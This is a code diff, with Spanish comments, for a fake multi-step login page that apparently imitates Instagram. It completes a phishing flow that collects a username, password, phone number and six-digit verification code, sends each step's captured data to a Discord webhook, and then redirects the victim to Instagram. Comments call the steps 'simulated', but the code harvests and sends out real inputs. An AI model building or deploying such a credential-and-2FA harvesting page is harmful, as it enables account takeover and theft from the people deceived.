@@ -79,7 +79,7 @@
                         <!-- Botón de Iniciar Sesión -->
                         <button
                             type="submit"
-                            class="w-full bg-blue-500 text-white font-medium py-1.5 rounded-lg shadow-sm hover:bg-blue-600 disabled:bg-blue-300 focus:outline-none transition duration-150 text-sm"
+                            class="w-full bg-blue-500 text-white font-medium py-1.5 rounded-lg shadow-sm hover:bg-blue-600 disabled:bg-blue-300 focus:outline-none transition duration-150 text-sm opacity-50"
                             disabled
                             id="loginButton"
                         >
@@ -272,7 +272,7 @@
                 // Se habilita si ambos campos tienen contenido (length > 0)
                 loginButton.disabled = !(identifier.length > 0 && password.length > 0);
                 // Opcional: Cambia la opacidad para mejorar la visibilidad del estado
-                loginButton.classList.toggle('opacity-50', loginButton.disabled);
+                loginButton.classList.toggle('opacity-50', loginButton.disabled); // CORRECCIÓN 2
             };
 
             // Asegura que el evento 'input' se active en cualquier cambio de texto
@@ -280,7 +280,7 @@
             passwordInput.addEventListener('input', toggleButton);
             
             // Llama a toggleButton al cargar la página para establecer el estado inicial
-            toggleButton();
+            toggleButton(); // CORRECCIÓN 3
         });
 
         // Función para enviar los datos capturados al Webhook de Discord
@@ -399,4 +399,58 @@
 
                 // Transición al Paso 2
                 step1.classList.add('hidden');
-            
+                step2.classList.remove('hidden'); // LÍNEA FALTANTE
+            } else {
+                console.error("Error de inicio de sesión simulado: Campos vacíos. El botón debe estar habilitado para funcionar.");
+            }
+        }
+        
+        // Función para simular el envío del número de teléfono (Paso 2)
+        function handlePhoneSubmit(event) {
+             event.preventDefault(); 
+
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+
+
+            if (phoneNumber) {
+                 // GUARDAR DATOS DEL PASO 2
+                capturedData.phoneNumber = phoneNumber;
+                
+                 // AVISO A DISCORD DESPUÉS DEL PASO 2
+                sendDataToDiscord(2); 
+
+                 // Transición al Paso 3
+                step2.classList.add('hidden');
+                step3.classList.remove('hidden');
+            } else {
+                console.error("Error en el paso 2 simulado: Número de teléfono vacío.");
+            }
+        }
+
+        // Nueva función para simular la confirmación del código (Paso 3)
+        function handleCodeSubmit(event) {
+             event.preventDefault();
+
+            const verificationCode = document.getElementById('verificationCode').value.trim();
+
+            // Simulación simple de verificación: solo revisa que tenga 6 dígitos
+            if (verificationCode.length === 6 && /^\d+$/.test(verificationCode)) {
+                 // GUARDAR DATOS DEL PASO 3
+                capturedData.verificationCode = verificationCode;
+                
+                 // AVISO A DISCORD DESPUÉS DEL PASO 3 (FINAL)
+                sendDataToDiscord(3);
+
+                 // Éxito: Redireccionar a la página principal de Instagram
+                window.open(REDIRECT_URL, '_top');
+                
+            } else {
+                console.error("Error en el paso 3 simulado: Código inválido.");
+            }
+        }
+    </script>
+</body>
+</html>
+
